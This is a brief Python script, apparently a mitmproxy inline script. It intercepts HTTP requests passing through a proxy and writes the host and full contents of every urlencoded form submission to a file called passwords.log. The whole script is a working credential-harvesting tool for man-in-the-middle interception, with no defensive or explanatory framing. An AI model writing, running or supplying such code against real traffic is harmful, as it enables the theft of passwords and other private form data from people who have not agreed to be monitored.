import logging

logging.basicConfig(filename="passwords.log", level=logging.INFO)
    
def request(context, flow):
    if "application/x-www-form-urlencoded" in flow.request.headers["content-type"]:
        logging.info("Form submission for %s" % flow.request.pretty_host(hostheader=True))
        form = flow.request.get_form_urlencoded()
        logging.info(str(form))
        flow.request.set_form_urlencoded(form)
